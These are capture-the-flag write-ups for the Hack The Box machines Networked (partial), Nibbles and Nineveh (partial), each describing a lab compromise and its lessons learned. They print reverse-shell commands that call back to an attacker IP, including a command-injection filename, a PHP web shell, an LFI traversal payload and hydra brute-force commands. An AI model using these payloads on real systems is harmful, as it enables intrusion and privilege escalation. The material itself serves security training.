I ran the _LinEnum.sh_ and _pspy64_ programs but didn’t find anything unusual. I did notice that in the home directory of _guly_ there’s a php script and a crontab file. We have read permission on both of them.

```text
bash-4.2$ ls -la
total 28
drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly  33 Oct 30  2018 user.txt
```

View the content of crontab.guly.

```text
bash-4.2$ cat crontab.guly 
*/3 * * * * php /home/guly/check_attack.php
```

It’s running the _file check\_attack.php_ script every 3 minutes. If you’re not familiar with the crontab format, refer to the following [link](https://www.netiq.com/documentation/cloud-manager-2-5/ncm-reference/data/bexyssf.html).

Let’s view the _check\_attack.php_ file.

```text
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";$files = array();
$files = preg_grep('/^([^.])/', scandir($path));foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";#print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}?>
```

The script is taking in all the files in the /var/www/html/uploads directory and running the _getnameCheck\(\)_ and _check\_ip\(\)_ functions on it from the lib.php file.

```text
function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}
```

The _getnameCheck\(\)_ function simply separates the name of the file from the extension of the file. The _check\_ip\(\)_ function checks if the filename is a valid IP address. If it is not, it will return false which will trigger the attack component in the _check\_attack.php_ file.

```text
if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
```

This passes the path of the file to the exec\(\) function and deletes it. Of course, no validation is being done on the input of the exec\(\) function and so we can abuse it to escalate privileges.

Change to the /var/www/html/uploads directory and create the following file.

```text
touch '; nc -c bash 10.10.14.12 3333'
```

The “;” will end the “rm” command in the exec\(\) function and run the nc command, which will send a reverse shell back to our machine.

Set up a listener to receive the reverse shell.

```text
nc -nlvp 3333
```

Wait for the cron job to run and we get a shell!

![](https://miro.medium.com/max/766/1*OkP1WlM1QKT84lApLyJYSQ.png)

Convert the shell to a fully interactive shell and grab the user.txt flag.

![](https://miro.medium.com/max/451/1*2VJG0HmFnJgPRxZFrriRkA.png)

We need to escalate our privileges to root. I downloaded the _LinEnum_ script and ran it. It looks like we can run the following file as root without a password.

```text
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh[+] Possible sudo pwnage!
/usr/local/sbin/changename.sh
```

View the permissions on the file.

```text
[guly@networked ~]$ ls -la /usr/local/sbin | grep changename.sh
-rwxr-xr-x   1 root root 422 Jul  8  2019 changename.sh
```

We only have read and execute permissions on the file. Let’s view the content of the file.

```text
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoFregexp="^[a-zA-Z0-9_\ /-]+$"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

It takes in the content of the file _ifcfg-guly_ and does a simple regex check on the input. Let’s view the permissions on that file.

```text
[guly@networked ~]$ ls -la /etc/sysconfig/network-scripts/ | grep ifcfg-guly
-rw-r--r--  1 root root   114 Jan 14 04:09 ifcfg-guly
```

We can only read it. Let’s view the file.

```text
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
```

The NAME is assigned a system command, so we can probably use this to escalate privileges. After a bit of googling, I found this [bug report](https://bugzilla.redhat.com/show_bug.cgi?id=1697473) that states that incorrect whitespace filtering on the NAME attribute leads to code execution. Since we can run the changename.sh script with sudo privileges, it will prompt us to enter the NAME value and since it’s not properly validated, we can get a shell with root privileges!

![](https://miro.medium.com/max/866/1*Vmd3WoSA8qufDqIbSHsJVQ.png)

Grab the root.txt flag.

![](https://miro.medium.com/max/648/1*mmvPI8v99qeyDt4tfjHf8A.png)

## Lessons Learned <a id="e363"></a>

To gain an initial foothold on the box we exploited two vulnerabilities.

1. Sensitive Information Disclosure. The backup source code of the application was available for anyone to view. We analyzed the code in order to better understand the defenses that were put in place for file uploads, which eventually helped us bypass the defenses. Any sensitive information should not be publicly disclosed.
2. Insufficient Input Validation. The upload functionality of the website had insufficient validation on the names of uploaded files. Therefore, we were able to upload a malicious file and run the malicious file to give us an initial foothold on the system. Proper input validation checks should be put in place on all user input.

To escalate privileges we exploited two vulnerabilities.

1. Command Injection. A user owned cron job was taking in the filenames of a non-privileged user and running system commands on the filenames. Since insufficient input validation was put in place, we were able to create a file with a file name that contained a command that sent a reverse shell back to our machine. Since the cron job was running with the user _guly’s_ privileges, we were able to escalate our privileges to _guly_. To prevent this vulnerability from occurring, there are [many defenses](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) that can be put in place, including but not limited to the use of libraries or APIs as an alternative to calling OS commands directly.
2. Sudo Security Misconfiguration. A non-privileged user should not have sudo execute rights on a script that takes in the user’s input to run a privileged task. Since the input was not validated and we were able to run the file with root privileges, we were able to escalate our privileges to _root_. The administrator should have conformed to the principle of least privilege.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
nibbles-writeup-w-o-metasploit.md
# Nibbles Writeup w/o Metasploit

![](https://miro.medium.com/max/570/1*2VjSh0oCcyX65RPaFHhtrg.png)

## Reconnaissance <a id="38e3"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA htb/nibbles/nmap/initial 10.10.10.75
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that two ports are open:

* **Port 80:** running Apache httpd 2.4.18
* **Port 22**: running OpenSSH 7.2p2

![](https://miro.medium.com/max/937/1*7oP4YyrV76UDbNOq2ToxSg.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA htb/nibbles/nmap/full 10.10.10.75
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/941/1*SRhDq1EETKpOoWKYYRxIOw.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA htb/nibbles/nmap/udp 10.10.10.75
```

I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don’t have the UDP scan results.

## Enumeration <a id="a8fc"></a>

Visit the site in the browser.

![](https://miro.medium.com/max/547/1*3FrcGEygHlOwyJbv1AuswQ.png)

Nothing useful there, so right click and select View Page Source. We find a comment that gives us a new directory.

![](https://miro.medium.com/max/519/1*1-dNWnBc1dnTpx5kJniw-Q.png)

This leads us to the following page. You can see at the bottom that it is powered by Nibbleblog. This is an indication that it an off the shelf software as apposed to custom software.

![](https://miro.medium.com/max/877/1*LxRNevTy-KZ_yg6vWGflvw.png)

To confirm that, let’s google Nibbleblog.

![](https://miro.medium.com/max/807/1*UO3yRXkP0HipFv8npZRxYg.png)

It’s an open-source engine for creating blogs using PHP. This is good news for us for two reasons: \(1\) you can download the software and play with it offline. This way you can poke at it as much as you want without having to worry about detection, and \(2\) since it is open-source and used by other people, it probably has reported vulnerabilities. If this was custom software, we would have had to find zero day vulnerabilities.

In order to see if this application is vulnerable, we need to find its version number. To do that, let’s run Gobuster to enumerate directories.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.75/nibbleblog
```

We get back the following results.

![](https://miro.medium.com/max/722/1*tGAlyo0Pvcf-QncC-VE0_w.png)

Navigate to the README page and there we find out that it is using version 4.0.3.

![](https://miro.medium.com/max/537/1*EHgucHzzcceVLkf_-8VKCA.png)

Google the name of the software and version to see if it has any exploits.

![](https://miro.medium.com/max/790/1*mpm3Gw2cn-8mbjMPLRxfxg.png)

A shell upload vulnerability, that’s what I like to see!

## Gaining an Initial Foothold <a id="1d2f"></a>

Navigate to the shell upload exploit [page](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html).

![](https://miro.medium.com/max/654/1*1xbLN6TDATKP4gWtyd7t1A.png)

Several important pieces of information are mentioned in the page.

* It’s a code execution vulnerability.
* The vulnerability is in the “My image” plugin that allows the upload of PHP files. So it would allow us to upload a PHP reverse shell.
* It’s an authenticated vulnerability which means that we need admin credentials before we exploit this vulnerability.

Alright, so the next steps would be:

1. Navigate to the admin login page and figure out the admin credentials
2. Navigate to the My Image plugin page and upload a PHP reverse shell

As mentioned in the Proof of Concept, the admin page can be found here.

```text
http://10.10.10.75/nibbleblog/admin.php
```

Navigate to it.

![](https://miro.medium.com/max/753/1*Z8SER-sJTBzlRRONNBgvZg.png)

Now we need admin credentials. When I’m presented with an enter credentials page, the first thing I try is common credentials \(admin/admin, admin/nibbles, nibbles/nibbles, nibbles/admin\). If that doesn’t work out, I look for default credentials online that are specific to the technology. Last, I use a password cracker if all else fails.

In this case, the common credentials admin/nibbles worked! Step \#1 is complete!

Next, we need to navigate to the My Image plugin. Click on Plugins &gt; My image &gt; Configure.

![](https://miro.medium.com/max/754/1*sPkbF7c0jH5LYlM-lL_dQA.png)

Head over to [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) and get the code for a PHP reverse shell. Change the IP address and port used by your attack machine. Then save it in a file called image.php and upload it on the site.

![](https://miro.medium.com/max/769/1*c8cnf_SINB2LNmkqDRL_WA.png)

Start a listener on the above chosen port.

```text
nc -nlvp 1234
```

In the browser, navigate to the image we just uploaded to run the reverse shell script.

```text
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php
```

We have a low privileged shell!

![](https://miro.medium.com/max/720/1*lZL8xDkL_Mh-CW2kO7buJA.png)

Let’s first upgrade to a better shell. Python is not installed but python 3 is.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Grab the user flag.

![](https://miro.medium.com/max/530/1*WmmNZ9MV9MeEVFKbEkGYEg.png)

Now we need to escalate privileges.

## Privilege Escalation <a id="cc00"></a>

Find out what privileges you have.

```text
sudo -l
```

![](https://miro.medium.com/max/722/1*j20Aa5lZrmYgZSu9ffGncQ.png)

We can run the script monitor.sh in the above specified directory as root without having to enter a root password. Why is that good news for us? If we call a shell in that script, we can run it as root!

First, let’s see what the script contains.

```text
cat home/nibbler/personal/stuff/monitor.sh
```

![](https://miro.medium.com/max/666/1*udPCq0mgasnrSF34S3jVyA.png)

It does not exist! We’ll have to create one.

```text
mkdir -p home/nibbler/personal/stuff
cd /home/nibbler/personal/stuff
vi monitor.sh
```

In the monitor.sh script add the following code.

```text
#!/bin/sh
bash
```

Give it execute privileges.

```text
chmod +x monitor.sh
```

Run the script with sudo.

```text
sudo ./monitor.sh
```

We are root!

![](https://miro.medium.com/max/476/1*dpF0oqvXpZG8l1gMDzaRyw.png)

Grab the root flag.

![](https://miro.medium.com/max/627/1*9ZfNdV8fbeS_ufYSsta6GQ.png)

## Lessons Learned <a id="0914"></a>

To gain an initial foothold on the target machine we had to perform two things: \(1\) guess the credentials of the administrator, and \(2\) exploit a vulnerability in the installed Nibbleblog version. The application was using weak authentication credentials, and so we were able to guess the admistrator credentials. The application was also using the vulnerable “My image” plugin which allowed us to run a reverse shell back to our attack machine. This shows the importance of enforcing the use of strong authentication credentials and patching your software. In this case, I’m not sure if a patch was even made available. The application also reached its end of life, so the recommendation would be to use other software to host your blog, or at the very least remove the “My image” plugin so that an attacker cannot exploit this specific vulnerability.

To escalate to root privileges, I used a security configuration that was clearly no longer needed by the user since the script is no longer there. This allowed me to run arbitrary commands with root privileges. The system admin should have conformed to the principle of least privilege and not given a regular user the ability to run a script with root privileges.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
nineveh-writeup-w-o-metasploit.md
# Nineveh Writeup w/o Metasploit

![](https://miro.medium.com/max/581/1*YZOfGDCZBv_mSZ5ida5p7Q.png)

## Reconnaissance

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.43
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that 2 ports are open:

* Port 80: running Apache httpd 2.4.18 over HTTP
* Port 443: running Apache httpd 2.4.18 over HTTPS

```text
Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-28 08:48 EST
Nmap scan report for 10.10.10.43
Host is up (0.042s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.36 seconds
```

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -p- -oA full 10.10.10.43
```

No other ports are open.

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -p- -oA udp 10.10.10.43
```

We get back the following result showing no ports are open.

```text
Srting Nmap 7.80 ( https://nmap.org ) at 2019-12-28 08:52 EST
Nmap scan report for 10.10.10.43
Host is up (0.035s latency).                                                                                                                   
All 65535 scanned ports on 10.10.10.43 are open|filtered                                                                                       
                                                                                                                                               
Nmap done: 1 IP address (1 host up) scanned in 2335.03 seconds
```

Before we move on to enumeration, let’s make a few mental notes about the nmap scan results.

* We only have two points of entry: port 80 & port 443.
* The nmap scan leaks the domain name of the machine: nineveh.htb.
* The SSL certificate on port 443 is expired, so we’ll have to disable TLS checking when running our tools.

## Enumeration <a id="63f4"></a>

First, add the domain name to the /etc/hosts file.

```text
10.10.10.43 nineveh.htb
```

We’ll start by enumerating port 80.

**Port 80**

Visit the page in the browser.

![](https://miro.medium.com/max/790/1*wx5qy-I_hJEjtwsgET7o0g.png)

View the page source to see if it gives you any other information.

![](https://miro.medium.com/max/624/1*fUjf36Z0U2-AVqSyID6UNQ.png)

There’s nothing there, so we’ll run gobuster on the application.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u nineveh.htb
```

* **dir:** uses directory/file brute forcing mode.
* **-w:** path to the wordlist.
* **-u:** the target URL or Domain.

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://nineveh.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/28 09:05:44 Starting gobuster
===============================================================
/department (Status: 301)
/server-status (Status: 403)
===============================================================
2019/12/28 09:20:06 Finished
===============================================================
```

Visit the /department directory.

![](https://miro.medium.com/max/990/1*AdspY5W3rS9UlgZzqPsGug.png)

We get a login form. View the page source to to see if it gives you any other information.

![](https://miro.medium.com/max/596/1*i60eLLy2K1kaOIqR67QonA.png)

We find a comment that might be useful later. We have two possible usernames _admin_ and _amrois_. Let’s try the usernames on the login form.

If we try to login with the user _admin_ and a random password we get the error “Invalid Password!”, whereas if we try to login with the user _amrois_ and a random password we get the error “invalid username”. This verbose message that is outputted by the application allows us to enumerate usernames. So far, we know that _admin_ is a valid user.

This looks like a custom application, so I tried common credentials admin/admin, admin/amrois, admin/password but none of them worked. Next, let’s run hydra on the login form.

First, intercept the request with Burp.

![](https://miro.medium.com/max/767/1*lOkjCn4Qv8RSqRLSqCkFPw.png)

Then run hydra.

```text
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!"
```

* **-l:** specifies the username to be admin.
* **-P:** specifies the file that contains the passwords.
* **http-post-form:** specifies an HTTP POST request.
* **“….”:** the content in the double quotes specifies the username/password parameters to be tested and the failed login message.

We get back the following result.

```text
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-28 12:14:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://nineveh.htb:80/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 2421.00 tries/min, 2421 tries in 00:01h, 14341978 to do in 98:44h, 16 active
[VERBOSE] Page redirected to http://nineveh.htb/department/manage.php
[80][http-post-form] host: nineveh.htb   login: admin   password: 1q2w3e4r5t
[STATUS] attack finished for nineveh.htb (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-28 12:16:12
```

It found the valid password! Log into the application using the credentials we found.

![](https://miro.medium.com/max/1100/1*uegt4ohJV85GLwtX1hBBSg.png)

Visit the _Notes_ tab. We get the following text.

![](https://miro.medium.com/max/962/1*0gGdIqE4BzhufdOfGf5t9A.png)

None of it makes much sense at this point. They do mention a secret folder. Maybe we’ll find that while enumerating port 443. One thing to notice is the URL that generates the page looks like a file path.

![](https://miro.medium.com/max/621/1*bU60nwjic6gy9R15Ov224A.png)

When you see a file path, the first thing you should try is an LFI. I tried and it didn’t exactly work. When I try the following string

```text
../../../../../../../etc/passwd
```

I get a “No Note is selected” message. However, when I try the following string

```text
files/ninevehNotes/../../../../etc/passwd
```

I get a warning message.

![](https://miro.medium.com/max/945/1*U1j8GxuGYRFJqHnkBnqkcg.png)

If I remove “ninevehNotes” from the URL

```text
files/../../../../etc/passwd
```

I’m back to the “No Note is selected” message. This leads me to believe that it is vulnerable to LFI, however, there is a check on the backend that is grepping for the string “ninevehNotes” since my query doesn’t work without it.

According to the error, we’re in the /www/html/department/ directory, so we need to go three directories above. Let’s try with this string.

```text
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../etc/passwd
```

It worked!

![](https://miro.medium.com/max/798/1*vjAwNSgYbO7wqRSF64zkEg.png)

When it comes to LFIs, you usually need to chain it to another vulnerability in order to get remote code execution. Therefore, I’m going to start enumerating the next port to see if I can find another vulnerability that I can chain this one to.

**Port 443**

Visit the page in the browser.

![](https://miro.medium.com/max/1048/1*bY5XWzYukU-9YR6yWiSM-Q.png)

View the page source to see if it gives you any extra information. We don’t get anything useful. Next, view the SSL certificate.

![](https://miro.medium.com/max/715/1*28BdwnyfX84aP3LMh_pMCA.png)

We find an email address that might be useful later. Next, run gobuster on the application.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://nineveh.htb -k
```

* **dir:** uses directory/file brute forcing mode.
* **-w:** path to the wordlist.
* **-u:** the target URL or Domain.
* **-k:** skip SSL certificate verification.

We get back the following result.

```text
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://nineveh.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/28 09:20:47 Starting gobuster
===============================================================
/db (Status: 301)
/server-status (Status: 403)
/secure_notes (Status: 301)
===============================================================
2019/12/28 09:34:46 Finished
===============================================================
```

The **/secure\_notes** directory gives us the following image.

![](https://miro.medium.com/max/1147/1*okFaCLGQrlJiy91DsIw-kw.png)

This might be what the comment “check your secret folder” was referring to. Save the image, it might have a secret stored in it. We’ll look into that later.

The **/db** directory leads us to the following page.

![](https://miro.medium.com/max/878/1*0AaLl1jKv813LZRQRhst3w.png)

I tried the default password “admin” for phpLiteAdmin v1.9 but that did not work. Let’s try brute-forcing the password. First, intercept the request in Burp.

![](https://miro.medium.com/max/779/1*n7CfvKcuwwRCvVQjsYU0pA.png)

Then run hydra on the login form.

```text
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect password."
```

* **-l:** specifies the username to be admin.
* **-P:** specifies the file that contains the passwords.
* **http-post-form:** we’re sending a POST request.
* **“….”:** the content in the double quotes specifies the username/password parameters to be tested and the failed login message.

We get back the following result.

```text
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-12-28 11:12:56
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-forms://nineveh.htb:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true&Login=Login:Incorrect password.
[443][http-post-form] host: nineveh.htb   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-12-28 11:13:53
```

We got a valid password! Use password123 to log into the application. Since this is an off the shelf application, let’s use searchsploit to find out if it is associated with any vulnerabilities.

```text
searchsploit phpLiteAdmin 1.9
```

We get back the following result.

![](https://miro.medium.com/max/1316/1*JyUuvNiR8gXa8ZcDsDE3aA.png)

Let’s view the content of the Remote PHP Code Injection exploit. According to the comments made in the[ exploit](https://www.exploit-db.com/exploits/24044), an attacker can create a sqlite database with a php extension and insert php code as text fields. When done, the attacker can execute it simply by accessing the database file using the browser.

This is exactly the vulnerability I was hoping to find! This vulnerability allows me to drop a malicious file on the server and the LFI vulnerability we found earlier allows me to call and execute my malicious file.

## Gaining an Initial Foothold <a id="0917"></a>

In the **Create New Database** section, create a new database called random.php. Then click on random.php in the **Change Database** section. There, create a new table called _random_ with _1_ field. In the **Field** parameter add the following code and change the **Type** to _TEXT_.

```text
<?php echo system($_REQUEST ["cmd"]); ?>
```

![](https://miro.medium.com/max/864/1*sd8OxwsILFYUSd-lsWkosw.png)

Click **Create**. As mentioned in the below image, the file is created in the directory /var/tmp.

![](https://miro.medium.com/max/653/1*YESlKID92HzlKbVxaNrIpg.png)

Now, let’s go back to the LFI vulnerability and execute our php code.

```text
http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../../../../var/tmp/random.php&cmd=ls
```

We get back the following page.

![](https://miro.medium.com/max/956/1*lJlymLsD4O7ijnZqS2XJdg.png)

We have code execution! Let’s intercept the request in Burp and add a reverse shell to the cmd parameter.

First, visit pentestmonkey and get the code for a php reverse shell.

```text
php -r '$sock=fsockopen("10.10.14.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Then add the code to the cmd parameter in Burp and URL encode it \(Ctrl+U\).

![](https://miro.medium.com/max/689/1*oX7F42n0flGOiLq1XrJf9A.png)

Setup a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Send the request. We have a shell!

![](https://miro.medium.com/max/798/1*mcofvN8OWNirFroW5SOJig.png)

Let’s upgrade it to a partially interactive bash shell.

```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

‌To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

‌Once that is done, run the command “fg” to bring netcat back to the foreground. Then use the following command to give the shell the ability to clear the screen.

```text
export TERM=xterm
```

Before I look at the user.txt flag, let’s view the content of manage.php.

![](https://miro.medium.com/max/402/1*FKX8ZCQLjgKM8OOUnlZbdw.png)

As we suspected, it’s doing a check on the string “ninevehNotes” when running a file.

Now let’s view the permission of the user.txt file.

```text
www-data@nineveh:/var/www/html/department$ ls -la /home/amrois/         
total 32
drwxr-xr-x 4 amrois amrois 4096 Jul  3  2017 .
drwxr-xr-x 3 root   root   4096 Jul  2  2017 ..
-rw------- 1 amrois amrois    0 Jul  2  2017 .bash_history
-rw-r--r-- 1 amrois amrois  220 Jul  2  2017 .bash_logout
-rw-r--r-- 1 amrois amrois 3765 Jul  2  2017 .bashrc
drwx------ 2 amrois amrois 4096 Jul  3  2017 .cache
-rw-r--r-- 1 amrois amrois  655 Jul  2  2017 .profile
drwxr-xr-x 2 amrois amrois 4096 Jul  2  2017 .ssh
-rw------- 1 amrois amrois   33 Jul  2  2017 user.txt
```

We’re running as www-data, so we don’t have rights to read the file. We need to escalate our user privileges.

## Privilege Escalation <a id="31c3"></a>

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, change to the /tmp directory where we have write privileges and download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.12:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

Only one thing stands out in the output.

![](https://miro.medium.com/max/1126/1*a66UrLJZtw7xOjPz30diJg.png)

In our nmap scan, port 22 was not reported to be open, however, the LinEnum script reports it as listening on localhost. I’m not sure what to do with this piece of information but I’ll keep it at the back of my mind in case I don’t find any other way to escalate privileges.

Next, let’s try pspy. If you don’t have the script, you can download it from the following github repository.

```text
https://github.com/DominicBreuker/pspy
```

Upload it and run it on the attack machine in the same way we did for LinEnum.

After a minute we see an interesting process pop up.

![](https://miro.medium.com/max/890/1*ekBPVdpGUEeu7fHUwwkQCA.png)

Every minute or so the chkrootkit is being run. I’ve never seen that on a machine before so I googled it and found out that it is a program intended to help system administrators check their system for known rootkits. Next, I googled “chkrootkit privilege escalation” and landed on this [exploit](https://www.exploit-db.com/exploits/33899).

There is a privilege escalation vulnerability with old versions of this software that will run any executable file named /tmp/update as root. Therefore, all we have to do is create an “update” file that contains a reverse shell and wait for the scheduled task to give us a shell with root privileges.

To do that, navigate to the /tmp directory and create the file update. In the update file add the following code.

```text
#!/bin/bashphp -r '$sock=fsockopen("10.10.14.12",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Set up a listener to receive the reverse shell.

```text
nc -nlvp 1234
```

Wait a minute until the scheduled task runs.

![](https://miro.medium.com/max/737/1*fkGv4JXqwIYAfUDWhzfFow.png)

We get a privileged shell! Now we can view the user.txt flag and the root.txt flag.

![](https://miro.medium.com/max/608/1*_7rc4kgqnst7z5OJHY2F0g.png)

## Extra Content <a id="7b47"></a>

After watching [ippsec’s video](https://www.youtube.com/watch?v=K9DKULxSBK4) on how to solve the machine, I found another way to solve it.

Remember the nineveh.png image we found in the /secure\_notes directory? It turns out that it has a user’s private and public SSH keys.

To extract the keys, first use binwalk to search the image for any embedded files and executable code.

```text
binwalk nineveh.png
```

We get back the following result showing that the image does contain compressed files.

![](https://miro.medium.com/max/1047/1*vn6XcaiCL3ERStMlKmhi0A.png)

